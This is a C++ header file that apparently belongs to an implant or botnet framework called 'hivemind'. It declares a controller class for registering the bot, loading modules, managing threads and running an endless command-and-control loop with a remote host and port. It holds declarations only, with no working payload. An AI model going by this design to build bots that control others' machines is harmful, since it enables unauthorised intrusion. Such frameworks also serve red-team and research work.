#ifndef LOGIC_CONTROLLER_H
#define LOGIC_CONTROLLER_H
#include "transport.hpp"
#include "module.hpp"
#include "debugging.hpp"
#include "comms.hpp"
#include "json.hpp"
#include "hivemind.h"

#include <map>
#include <string>
#include <memory>
#include <thread>

#ifdef _WIN32
#include "windows.hpp"
#elif __linux__
#include "linux.hpp"
#else
#error Unsuppored OS
#endif

namespace hivemind_lib {

/**
 * @brief Contains info on a thread.
 */
struct ThreadInfo {
  /**
   * @brief The handle to the thread.
   */
  std::thread thread;
  /**
   * @brief When the thread was started.
   */
  time_t time_start;
  /**
   * @brief How long in seconds until to wait before timing the thread out.
   */
  long int timeout;
};

/**
 * @brief The "main" of the framework, orchestrates the function of the bot.
 */
class logic_controller {
 private:
  /**
   * @brief The method to use for transport
   */
  Transport_Enum transportMethod;
  /**
   * @brief Modules this bot can run and where they are located
   */
  std::map<std::string, std::shared_ptr<Module>> modules;
  /**
   * @brief The transport, used for C&C communications
   */
  std::unique_ptr<Transport> transport;
  /**
   * @brief Contains the info for this implant.
   */
  ImplantInfo implantInfo;
  /**
   * @brief A list of info about threads running. To be used by the thread manager.
   */
  std::vector<ThreadInfo> threadInfos;

 public:
  /**
   * @brief Constructor for Logic Controller
   */
  logic_controller();

  /**
   * @brief Add a function to the logic controller that is not in a module
   * @param func The pointer the function you want to register
   * TODO maybe remove this.
   */
  void AddFunction(std::function<std::string(std::string)> func);

  /**
   * @brief Start the registration process
   */
  int RegisterBot();
  /**
   * @brief Start the communication with the C&C server, this is an infinite loop.
   */
  void BeginComms();

  /**
   * @brief Add a module to the logic controller.
   * @param mod Module to add
   */
  void AddModule(ModuleEnum mod);

  /**
   * @brief Set the transportation method for C&C traffic
   * @param transport_enum The transport method to use
   */
  void SetTransportMethod(Transport_Enum transport_enum);

  /**
   * @brief Initialize the communication method.
   * @param hostname Host to connect to for C&C
   * @param port Port, optional for some transports, to connect to for C&C
   */
  void InitComms(std::string hostname, std::string port = "");
};
}
#endif
